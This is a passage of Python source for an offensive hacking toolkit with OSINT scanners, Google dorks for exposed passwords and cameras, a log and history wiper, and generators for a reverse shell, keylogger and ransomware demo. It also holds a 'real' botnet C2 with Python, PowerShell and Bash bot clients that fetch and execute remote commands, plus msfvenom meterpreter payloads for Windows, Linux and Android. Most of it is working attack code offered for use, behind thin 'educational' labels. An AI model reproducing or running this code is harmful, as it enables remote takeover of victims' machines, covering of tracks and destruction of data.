            "GitHub": f"https://github.com/{username}",
            "Reddit": f"https://reddit.com/user/{username}",
            "TikTok": f"https://tiktok.com/@{username}",
            "YouTube": f"https://youtube.com/@{username}",
            "Telegram": f"https://t.me/{username}",
            "Facebook": f"https://facebook.com/{username}"
        }
        
        print(f"\n{Colors.CYAN}[*] Checking username: {username}{Colors.END}\n")
        
        found = []
        for site, url in sites.items():
            try:
                r = requests.get(url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
                if r.status_code == 200:
                    print(f"{Colors.GREEN}[✓] {site}: {url}{Colors.END}")
                    found.append(site)
                else:
                    print(f"{Colors.DARK}[✗] {site}: not found{Colors.END}")
            except:
                print(f"{Colors.DARK}[?] {site}: error{Colors.END}")
            time.sleep(0.2)
        
        filename = f"{self.osint_dir}/username_{username}.txt"
        with open(filename, 'w') as f:
            f.write(f"Username: {username}\nFound on: {', '.join(found)}\nTime: {datetime.now()}\n")
        print(f"\n{Colors.GREEN}[+] Found {len(found)} profiles. Saved to: {filename}{Colors.END}")
    
    def subdomain_scan(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    SUBDOMAIN SCANNER                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        domain = input(f"{self.prompt()}domain > ")
        
        subdomains = [
            "www", "mail", "ftp", "blog", "dev", "test", "admin", "api", "app",
            "portal", "login", "dashboard", "cdn", "assets", "static", "docs",
            "support", "help", "status", "info", "news", "shop", "store"
        ]
        
        print(f"{Colors.CYAN}[*] Scanning {domain}{Colors.END}\n")
        
        found = []
        for sub in subdomains:
            test = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(test)
                print(f"{Colors.GREEN}[✓] {test} -> {ip}{Colors.END}")
                found.append(test)
            except:
                print(f"{Colors.DARK}[✗] {test}{Colors.END}")
            time.sleep(0.05)
        
        filename = f"{self.scan_dir}/subdomains_{domain}.txt"
        with open(filename, 'w') as f:
            f.write(f"Domain: {domain}\nFound: {', '.join(found)}\nTime: {datetime.now()}\n")
        print(f"\n{Colors.GREEN}[+] Found {len(found)} subdomains. Saved to: {filename}{Colors.END}")
    
    def port_scanner(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    PORT SCANNER MODULE                               ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        target = input(f"{self.prompt()}target IP/Domain > ")
        ports_input = input(f"{self.prompt()}ports (1-1000 or 80,443) > ") or "1-1000"
        
        if '-' in ports_input:
            start, end = map(int, ports_input.split('-'))
            port_range = range(start, end+1)
        else:
            port_range = [int(p.strip()) for p in ports_input.split(',')]
        
        print(f"{Colors.CYAN}[*] Scanning {target}...{Colors.END}\n")
        
        open_ports = []
        total = len(port_range)
        count = 0
        
        for port in port_range:
            count += 1
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((target, port)) == 0:
                print(f"{Colors.GREEN}[+] Port {port}: OPEN{Colors.END}")
                open_ports.append(port)
            sock.close()
            
            if count % 100 == 0:
                print(f"{Colors.DARK}[*] Progress: {count}/{total}{Colors.END}")
        
        filename = f"{self.scan_dir}/ports_{target}.txt"
        with open(filename, 'w') as f:
            f.write(f"Target: {target}\nOpen ports: {open_ports}\nTime: {datetime.now()}\n")
        print(f"\n{Colors.GREEN}[+] Found {len(open_ports)} open ports. Saved to: {filename}{Colors.END}")
    
    def dork_generator(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    GOOGLE DORK GENERATOR                             ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        dorks = {
            '1': ('Login Pages', ['inurl:login', 'inurl:admin', 'inurl:wp-admin', 'intitle:"login page"']),
            '2': ('Sensitive Files', ['ext:conf', 'ext:config', 'ext:sql', 'ext:db', 'ext:bak']),
            '3': ('Exposed Data', ['inurl:phpinfo.php', 'intitle:"index of"', 'inurl:dump.sql']),
            '4': ('Passwords', ['ext:passwd', 'ext:pwd', 'intext:"password" filetype:txt']),
            '5': ('Cameras', ['inurl:view/view.shtml', 'inurl:axis-cgi/jpg', 'intitle:"Live View"'])
        }
        
        print(f"{Colors.CYAN}Categories:{Colors.END}")
        for key, (name, _) in dorks.items():
            print(f"{Colors.GREEN}[{key}]{Colors.WHITE} {name}{Colors.END}")
        print(f"{Colors.GREEN}[0]{Colors.WHITE} Custom dork{Colors.END}")
        
        choice = input(self.prompt())
        
        if choice == '0':
            dork = input(f"{self.prompt()}custom dork > ")
            print(f"\n{Colors.GREEN}[+] https://www.google.com/search?q={dork.replace(' ', '+')}{Colors.END}")
        elif choice in dorks:
            name, dork_list = dorks[choice]
            print(f"\n{Colors.GREEN}[+] {name} Dorks:{Colors.END}")
            for dork in dork_list:
                print(f"{Colors.CYAN}    {dork}{Colors.END}")
                print(f"    https://www.google.com/search?q={dork.replace(' ', '+')}\n")
        
        filename = f"{self.osint_dir}/dorks.txt"
        with open(filename, 'w') as f:
            f.write(f"Dorks generated at {datetime.now()}\n")
            for key, (name, dork_list) in dorks.items():
                f.write(f"\n=== {name} ===\n")
                for dork in dork_list:
                    f.write(f"{dork}\n")
        print(f"{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
    
    def email_osint(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    EMAIL OSINT MODULE                                ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        email = input(f"{self.prompt()}email address > ")
        
        if '@' not in email:
            print(f"{Colors.RED}[!] Invalid email format{Colors.END}")
            return
        
        domain = email.split('@')[1]
        username = email.split('@')[0]
        
        print(f"\n{Colors.GREEN}[+] Domain: {domain}{Colors.END}")
        print(f"{Colors.GREEN}[+] Username: {username}{Colors.END}")
        
        print(f"\n{Colors.YELLOW}[*] OSINT Links:{Colors.END}")
        print(f"    HaveIBeenPwned: https://haveibeenpwned.com/account/{email}")
        print(f"    Google: https://www.google.com/search?q={email}")
        print(f"    Dehashed: https://dehashed.com/search?query={email}")
        
        filename = f"{self.osint_dir}/email_{username}.txt"
        with open(filename, 'w') as f:
            f.write(f"Email: {email}\nDomain: {domain}\nTime: {datetime.now()}\n")
        print(f"{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
    
    def whois_lookup(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    WHOIS LOOKUP MODULE                               ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        domain = input(f"{self.prompt()}domain > ")
        
        try:
            import whois
            w = whois.whois(domain)
            print(f"\n{Colors.GREEN}[+] WHOIS Results:{Colors.END}")
            print(f"    Domain: {w.domain_name}")
            print(f"    Registrar: {w.registrar}")
            print(f"    Creation Date: {w.creation_date}")
            print(f"    Expiration Date: {w.expiration_date}")
            print(f"    Name Servers: {w.name_servers}")
            
            filename = f"{self.osint_dir}/whois_{domain}.txt"
            with open(filename, 'w') as f:
                f.write(str(w))
            print(f"{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
        except:
            print(f"{Colors.RED}[!] WHOIS lookup failed{Colors.END}")
            os.system(f"whois {domain}")
    
    def dns_lookup(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    DNS LOOKUP MODULE                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        domain = input(f"{self.prompt()}domain > ")
        
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']
        
        print(f"\n{Colors.CYAN}[*] Looking up {domain}{Colors.END}\n")
        
        for rtype in record_types:
            try:
                import dns.resolver
                answers = dns.resolver.resolve(domain, rtype)
                print(f"{Colors.GREEN}[+] {rtype} Records:{Colors.END}")
                for ans in answers:
                    print(f"    {ans}")
            except:
                print(f"{Colors.DARK}[!] No {rtype} records{Colors.END}")
    
    # ==================== ATTACK MODULES ====================
    
    def start_c2(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    C2 / LISTENER SERVER                               ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} HTTP Server (python)")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Netcat Listener")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} Back")
        
        choice = input(self.prompt())
        
        if choice == '1':
            port = input(f"{self.prompt()}port (80) > ") or "80"
            print(f"{Colors.CYAN}[*] Starting HTTP server on port {port}{Colors.END}")
            os.system(f"python3 -m http.server {port}")
        elif choice == '2':
            port = input(f"{self.prompt()}port (4444) > ") or "4444"
            print(f"{Colors.CYAN}[*] Starting netcat listener on port {port}{Colors.END}")
            os.system(f"nc -lvnp {port}")
    
    def stealth_clean(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    STEALTH CLEANER                                     ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Wipe Bash/Zsh History")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Clear Logs")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} Full Forensic Cleanup")
        
        choice = input(self.prompt())
        
        if choice == '1':
            os.system("history -c")
            os.system("echo > ~/.bash_history")
            os.system("echo > ~/.zsh_history")
            print(f"{Colors.GREEN}[+] Shell history wiped{Colors.END}")
        elif choice == '2':
            os.system("rm -rf /tmp/* 2>/dev/null")
            os.system("find ~ -name '*.pyc' -delete 2>/dev/null")
            print(f"{Colors.GREEN}[+] Temp files cleared{Colors.END}")
        elif choice == '3':
            os.system("history -c")
            os.system("echo > ~/.bash_history")
            os.system("rm -rf /tmp/* 2>/dev/null")
            os.system("find ~ -name '*.pyc' -delete 2>/dev/null")
            print(f"{Colors.GREEN}[+] Full forensic cleanup complete{Colors.END}")
    
    def anonymity(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    VOID ANONYMITY MODULE                             ║
║              "Vanish without a trace"                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Start Tor")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Check Current IP")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} Anonymized IP (Tor)")
        
        choice = input(self.prompt())
        
        if choice == '1':
            os.system("tor &")
            print(f"{Colors.GREEN}[+] Tor started on port 9050{Colors.END}")
        elif choice == '2':
            print(f"{Colors.CYAN}[*] Current IP:{Colors.END}")
            os.system("curl -s ifconfig.me")
            print()
        elif choice == '3':
            print(f"{Colors.CYAN}[*] Anonymized IP (Tor):{Colors.END}")
            os.system("proxychains4 curl -s ifconfig.me 2>/dev/null")
            print()
    
    # ==================== UTILITY MODULES ====================
    
    def file_crypt(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    FILE ENCRYPTION                                    ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Encrypt file")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Decrypt file")
        
        choice = input(self.prompt())
        
        if choice == '1':
            filepath = input(f"{self.prompt()}file to encrypt > ")
            if os.path.exists(filepath):
                key = Fernet.generate_key()
                cipher = Fernet(key)
                with open(filepath, 'rb') as f:
                    data = f.read()
                encrypted = cipher.encrypt(data)
                with open(filepath + '.enc', 'wb') as f:
                    f.write(encrypted)
                with open(filepath + '.key', 'wb') as f:
                    f.write(key)
                print(f"{Colors.GREEN}[+] Encrypted: {filepath}.enc{Colors.END}")
                print(f"{Colors.GREEN}[+] Key saved: {filepath}.key{Colors.END}")
            else:
                print(f"{Colors.RED}[!] File not found{Colors.END}")
        elif choice == '2':
            encfile = input(f"{self.prompt()}encrypted file > ")
            keyfile = input(f"{self.prompt()}key file > ")
            if os.path.exists(encfile) and os.path.exists(keyfile):
                with open(keyfile, 'rb') as f:
                    key = f.read()
                cipher = Fernet(key)
                with open(encfile, 'rb') as f:
                    data = f.read()
                decrypted = cipher.decrypt(data)
                outfile = encfile.replace('.enc', '.dec')
                with open(outfile, 'wb') as f:
                    f.write(decrypted)
                print(f"{Colors.GREEN}[+] Decrypted: {outfile}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] Files not found{Colors.END}")
    
    def hash_generator(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    HASH GENERATOR                                     ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        text = input(f"{self.prompt()}text to hash > ")
        
        print(f"\n{Colors.GREEN}[+] Hashes:{Colors.END}")
        print(f"    MD5    : {hashlib.md5(text.encode()).hexdigest()}")
        print(f"    SHA1   : {hashlib.sha1(text.encode()).hexdigest()}")
        print(f"    SHA256 : {hashlib.sha256(text.encode()).hexdigest()}")
        print(f"    SHA512 : {hashlib.sha512(text.encode()).hexdigest()}")
    
    def encode_decode(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    ENCODE/DECODE MODULE                               ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Base64 Encode")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Base64 Decode")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} URL Encode")
        print(f"{Colors.GREEN}[4]{Colors.WHITE} URL Decode")
        
        choice = input(self.prompt())
        text = input(f"{self.prompt()}text > ")
        
        if choice == '1':
            encoded = base64.b64encode(text.encode()).decode()
            print(f"{Colors.GREEN}[+] Base64: {encoded}{Colors.END}")
        elif choice == '2':
            try:
                decoded = base64.b64decode(text).decode()
                print(f"{Colors.GREEN}[+] Decoded: {decoded}{Colors.END}")
            except:
                print(f"{Colors.RED}[!] Invalid Base64{Colors.END}")
        elif choice == '3':
            encoded = requests.utils.quote(text)
            print(f"{Colors.GREEN}[+] URL Encoded: {encoded}{Colors.END}")
        elif choice == '4':
            decoded = requests.utils.unquote(text)
            print(f"{Colors.GREEN}[+] URL Decoded: {decoded}{Colors.END}")
    
    def password_generator(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    PASSWORD GENERATOR                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        length = int(input(f"{self.prompt()}length (12) > ") or "12")
        count = int(input(f"{self.prompt()}count (5) > ") or "5")
        
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        
        print(f"\n{Colors.GREEN}[+] Generated passwords:{Colors.END}")
        for i in range(count):
            pwd = ''.join(random.choice(chars) for _ in range(length))
            print(f"    {i+1}. {pwd}")
        
        filename = f"{self.payload_dir}/passwords.txt"
        with open(filename, 'a') as f:
            f.write(f"\n--- {datetime.now()} ---\n")
            for i in range(count):
                f.write(f"{i+1}. {''.join(random.choice(chars) for _ in range(length))}\n")
        print(f"{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
    
    # ==================== EDUCATIONAL MALWARE ====================
    
    def educational_malware(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║              EDUCATIONAL MALWARE GENERATOR                          ║
║              FOR RESEARCH / TESTING ONLY                            ║
║              RUNS ONLY IN SANDBOX DIRECTORY                         ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.YELLOW}[!] WARNING: For educational purposes only!{Colors.END}")
        confirm = input(f"{self.prompt()}I understand (y/n) > ")
        
        if confirm.lower() != 'y':
            return
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Reverse Shell (Educational)")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Keylogger Demo")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} Ransomware Demo")
        print(f"{Colors.GREEN}[4]{Colors.WHITE} Back")
        
        choice = input(self.prompt())
        
        if choice == '1':
            self.edu_reverse_shell()
        elif choice == '2':
            self.edu_keylogger()
        elif choice == '3':
            self.edu_ransomware()
    
    def edu_reverse_shell(self):
        lhost = input(f"{self.prompt()}LHOST (your IP) > ")
        lport = input(f"{self.prompt()}LPORT > ")
        
        code = f'''#!/usr/bin/env python3
# EDUCATIONAL REVERSE SHELL - FOR TESTING ONLY
import socket,subprocess,os

if not os.getcwd().startswith(os.path.expanduser("~/malware_sandbox")):
    print("[!] For educational use only. Run in sandbox!")
    exit()

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{lhost}", {lport}))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

if __name__ == "__main__":
    connect()
'''
        
        sandbox = os.path.expanduser("~/malware_sandbox")
        os.makedirs(sandbox, exist_ok=True)
        filename = f"{sandbox}/reverse_shell_{int(time.time())}.py"
        with open(filename, 'w') as f:
            f.write(code)
        os.chmod(filename, 0o755)
        
        print(f"\n{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Run: python3 {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Listener: nc -lvnp {lport}{Colors.END}")
    
    def edu_keylogger(self):
        code = '''#!/usr/bin/env python3
# EDUCATIONAL KEYLOGGER DEMO - FOR TESTING ONLY
import os,sys
from datetime import datetime

if not os.getcwd().startswith(os.path.expanduser("~/malware_sandbox")):
    print("[!] For educational use only. Run in sandbox!")
    exit()

log_file = os.path.expanduser("~/malware_sandbox/keylog.txt")

try:
    from pynput.keyboard import Listener
except:
    print("[!] Install: pip install pynput")
    sys.exit(1)

def on_press(key):
    with open(log_file, 'a') as f:
        f.write(f"{datetime.now()}: {key}\\n")
    print(f"Key logged: {key}")

print(f"[*] Logging to: {log_file}")
print("[*] Press Ctrl+C to stop")

with Listener(on_press=on_press) as listener:
    listener.join()
'''
        
        sandbox = os.path.expanduser("~/malware_sandbox")
        os.makedirs(sandbox, exist_ok=True)
        filename = f"{sandbox}/keylogger_{int(time.time())}.py"
        with open(filename, 'w') as f:
            f.write(code)
        os.chmod(filename, 0o755)
        
        print(f"\n{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Run: python3 {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Install pynput: pip install pynput{Colors.END}")
    
    def edu_ransomware(self):
        target_dir = input(f"{self.prompt()}target dir (in sandbox) > ") or "~/malware_sandbox/test_files"
        target_dir = os.path.expanduser(target_dir)
        
        code = f'''#!/usr/bin/env python3
# EDUCATIONAL RANSOMWARE DEMO - FOR TESTING ONLY
import os
from cryptography.fernet import Fernet

if not os.getcwd().startswith(os.path.expanduser("~/malware_sandbox")):
    print("[!] For educational use only. Run in sandbox!")
    exit()

target_dir = "{target_dir}"
os.makedirs(target_dir, exist_ok=True)

for i in range(3):
    with open(f"{{target_dir}}/test_{{i}}.txt", 'w') as f:
        f.write("Test file for educational ransomware demo")

key = Fernet.generate_key()
cipher = Fernet(key)

for file in os.listdir(target_dir):
    filepath = os.path.join(target_dir, file)
    if os.path.isfile(filepath):
        with open(filepath, 'rb') as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(filepath, 'wb') as f:
            f.write(encrypted)
        print(f"[+] Encrypted: {{file}}")

print(f"\\n[!] Key: {{key.decode()}}")
print("[!] To decrypt, run:")
print(f"    cipher = Fernet(b'{{key.decode()}}')")
'''
        
        sandbox = os.path.expanduser("~/malware_sandbox")
        os.makedirs(sandbox, exist_ok=True)
        os.makedirs(target_dir, exist_ok=True)
        filename = f"{sandbox}/ransomware_demo_{int(time.time())}.py"
        with open(filename, 'w') as f:
            f.write(code)
        os.chmod(filename, 0o755)
        
        print(f"\n{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Run: python3 {filename}{Colors.END}")
    
    def botnet_c2(self):
        """BOTNET C2 SERVER - REAL COMMAND & CONTROL"""
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    BOTNET C2 SERVER                                   ║
║              REAL COMMAND & CONTROL CENTER                            ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Start C2 Server (HTTP API)")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Generate Bot Client (Windows/Linux/Android)")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} List Connected Bots")
        print(f"{Colors.GREEN}[4]{Colors.WHITE} Send Command to Bot")
        print(f"{Colors.GREEN}[5]{Colors.WHITE} Send Mass Command (All Bots)")
        print(f"{Colors.GREEN}[6]{Colors.WHITE} Botnet Statistics")
        print(f"{Colors.GREEN}[7]{Colors.WHITE} Start Discord Bot Controller")
        print(f"{Colors.GREEN}[8]{Colors.WHITE} Start Telegram Bot Controller")
        print(f"{Colors.GREEN}[0]{Colors.WHITE} Back")
        
        choice = input(self.prompt())
        
        if choice == '1':
            self.start_c2_server()
        elif choice == '2':
            self.generate_bot_client()
        elif choice == '3':
            self.list_bots()
        elif choice == '4':
            self.send_bot_command()
        elif choice == '5':
            self.send_mass_command()
        elif choice == '6':
            self.botnet_stats()
        elif choice == '7':
            self.start_discord_bot_controller()
        elif choice == '8':
            self.start_telegram_bot_controller()
    
    def start_c2_server(self):
        """Start Web Panel C2 Server"""
        print(f"{Colors.CYAN}[*] Starting Web Panel C2 Server...{Colors.END}")
        print(f"{Colors.CYAN}[*] Open browser: http://localhost:5000{Colors.END}")
        print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop server{Colors.END}")
    
        import subprocess
        import os
    
        web_panel_path = os.path.join(os.getcwd(), "web_panel")
        app_path = os.path.join(web_panel_path, "app.py")
    
        if os.path.exists(app_path):
            print(f"{Colors.CYAN}[*] Running: cd {web_panel_path} && python3 app.py{Colors.END}")
            os.system(f"cd {web_panel_path} && python3 app.py")
        else:
            print(f"{Colors.RED}[!] Web panel not found at: {app_path}{Colors.END}")
            print(f"{Colors.CYAN}[*] Run this command to start manually:{Colors.END}")
            print(f"    cd {web_panel_path} && python3 app.py")
         
    def generate_bot_client(self):
        """Generate Bot Client for Web Panel"""
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    BOT CLIENT GENERATOR                              ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        c2_server = input(f"{self.prompt()}C2 Server IP > ")
        
        bot_code = f'''#!/usr/bin/env python3
import requests
import subprocess
import time
import platform
import socket
import json
import os
import threading
import sys

C2_SERVER = "http://{c2_server}:5050"
BOT_ID = socket.gethostname() + "_" + str(os.getpid())

def register():
    try:
        data = {{
            "bot_id": BOT_ID,
            "ip": requests.get('https://api.ipify.org', timeout=5).text,
            "hostname": socket.gethostname(),
            "os": platform.platform()
        }}
        requests.post(f"{{C2_SERVER}}/api/register", json=data, timeout=10)
        print(f"[+] Registered to C2: {{BOT_ID}}")
    except Exception as e:
        print(f"[-] Registration failed: {{e}}")

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout if result.stdout else result.stderr
        requests.post(f"{{C2_SERVER}}/api/report/{{BOT_ID}}", json={{"output": output[:1000]}}, timeout=10)
        return output
    except Exception as e:
        return str(e)

def beacon():
    while True:
        try:
            resp = requests.get(f"{{C2_SERVER}}/api/beacon/{{BOT_ID}}", timeout=10)
            if resp.status_code == 200 and resp.json().get('command'):
                cmd = resp.json()['command']
                print(f"[+] Received command: {{cmd}}")
                execute_command(cmd)
        except Exception as e:
            pass
        time.sleep(10)

if __name__ == "__main__":
    register()
    beacon()
'''
        
        filename = f"{self.payload_dir}/web_bot_{int(time.time())}.py"
        with open(filename, 'w') as f:
            f.write(bot_code)
        os.chmod(filename, 0o755)
        
        print(f"\n{Colors.GREEN}[+] Bot client saved: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Run on target: python3 {filename}{Colors.END}")
        
    def generate_python_bot(self, c2_server):
        """Generate Python Bot Client"""
        import platform
        import hashlib
        import socket
        
        bot_id = socket.gethostname() + "_" + hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        
        bot_code = f'''#!/usr/bin/env python3
import requests
import subprocess
import time
import platform
import socket
import json
import os
import threading

C2_SERVER = "http://{c2_server}:5050"
BOT_ID = "{bot_id}"

def register():
    try:
        data = {{
            "bot_id": BOT_ID,
            "ip": requests.get('https://api.ipify.org', timeout=5).text,
            "hostname": socket.gethostname(),
            "os": platform.platform()
        }}
        requests.post(f"{{C2_SERVER}}/register", json=data, timeout=10)
    except:
        pass

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout if result.stdout else result.stderr
        requests.post(f"{{C2_SERVER}}/report/{{BOT_ID}}", json={{"output": output[:1000]}}, timeout=10)
        return output
    except Exception as e:
        return str(e)

def beacon():
    while True:
        try:
            resp = requests.get(f"{{C2_SERVER}}/beacon/{{BOT_ID}}", timeout=10)
            if resp.status_code == 200 and resp.json().get('command'):
                cmd = resp.json()['command']
                execute_command(cmd)
        except:
            pass
        time.sleep(10)

if __name__ == "__main__":
    register()
    beacon()
'''
        
        filename = f"{self.payload_dir}/python_bot_{int(time.time())}.py"
        with open(filename, 'w') as f:
            f.write(bot_code)
        
        print(f"\n{Colors.GREEN}[+] Python Bot saved: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Run on target: python3 {filename}{Colors.END}")
    
    def generate_windows_bot(self, c2_server):
        """Generate Windows EXE Bot using msfvenom"""
        print(f"{Colors.CYAN}[*] Generating Windows Bot...{Colors.END}")
        lport = input(f"{self.prompt()}Listener Port > ")
        os.system(f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={c2_server} LPORT={lport} -f exe -o {self.payload_dir}/windows_bot.exe")
        print(f"{Colors.GREEN}[+] Windows Bot saved: {self.payload_dir}/windows_bot.exe{Colors.END}")
    
    def generate_linux_bot(self, c2_server):
        """Generate Linux Binary Bot"""
        print(f"{Colors.CYAN}[*] Generating Linux Bot...{Colors.END}")
        lport = input(f"{self.prompt()}Listener Port > ")
        os.system(f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={c2_server} LPORT={lport} -f elf -o {self.payload_dir}/linux_bot")
        print(f"{Colors.GREEN}[+] Linux Bot saved: {self.payload_dir}/linux_bot{Colors.END}")
    
    def generate_android_bot(self, c2_server):
        """Generate Android APK Bot"""
        print(f"{Colors.CYAN}[*] Generating Android Bot...{Colors.END}")
        lport = input(f"{self.prompt()}Listener Port > ")
        os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={c2_server} LPORT={lport} -o {self.payload_dir}/android_bot.apk")
        print(f"{Colors.GREEN}[+] Android Bot saved: {self.payload_dir}/android_bot.apk{Colors.END}")
    
    def generate_powershell_bot(self, c2_server):
        """Generate PowerShell Bot"""
        bot_code = f'''
$C2 = "http://{c2_server}:5000"
$BotID = $env:computername

while($true) {{
    try {{
        $response = Invoke-RestMethod -Uri "$C2/beacon/$BotID" -Method Get
        if($response.command) {{
            $output = iex $response.command 2>&1 | Out-String
            Invoke-RestMethod -Uri "$C2/report/$BotID" -Method Post -Body (@{{output=$output}}|ConvertTo-Json) -ContentType "application/json"
        }}
    }} catch {{}}
    Start-Sleep -Seconds 10
}}
'''
        
        filename = f"{self.payload_dir}/powershell_bot.ps1"
        with open(filename, 'w') as f:
            f.write(bot_code)
        
        print(f"\n{Colors.GREEN}[+] PowerShell Bot saved: {filename}{Colors.END}")
    
    def generate_bash_bot(self, c2_server):
        """Generate Bash Bot"""
        bot_code = f'''#!/bin/bash
C2="http://{c2_server}:5000"
BOT_ID=$(hostname)

while true; do
    CMD=$(curl -s "$C2/beacon/$BOT_ID")
    if [ -n "$CMD" ]; then
        OUTPUT=$(eval "$CMD" 2>&1)
        curl -s -X POST "$C2/report/$BOT_ID" -H "Content-Type: application/json" -d "{{\"output\":\"$OUTPUT\"}}"
    fi
    sleep 10
done
'''
        
        filename = f"{self.payload_dir}/bash_bot.sh"
        with open(filename, 'w') as f:
            f.write(bot_code)
        os.chmod(filename, 0o755)
        
        print(f"\n{Colors.GREEN}[+] Bash Bot saved: {filename}{Colors.END}")
    
    def list_bots(self):
        """List connected bots from C2"""
        try:
            import requests
            resp = requests.get("http://localhost:5000/list_bots", timeout=5)
            bots = resp.json().get('bots', {})
            print(f"\n{Colors.GREEN}{'='*60}{Colors.END}")
            print(f"{Colors.BOLD}CONNECTED BOTS{Colors.END}")
            print(f"{Colors.GREEN}{'='*60}{Colors.END}")
            for bot_id, info in bots.items():
                print(f"{Colors.CYAN}[{bot_id}]{Colors.END}")
                print(f"    IP: {info.get('ip')}")
                print(f"    OS: {info.get('os')}")
                print(f"    Last Seen: {info.get('last_seen')}")
                print(f"    Status: {Colors.GREEN}{info.get('status')}{Colors.END}")
        except:
            print(f"{Colors.RED}[!] C2 Server not running{Colors.END}")
    
    def send_bot_command(self):
        """Send command to specific bot"""
        bot_id = input(f"{self.prompt()}Bot ID > ")
        command = input(f"{self.prompt()}Command > ")
        
        try:
            import requests
            data = {"bot_id": bot_id, "command": command}
            resp = requests.post("http://localhost:5000/send_cmd", json=data, timeout=5)
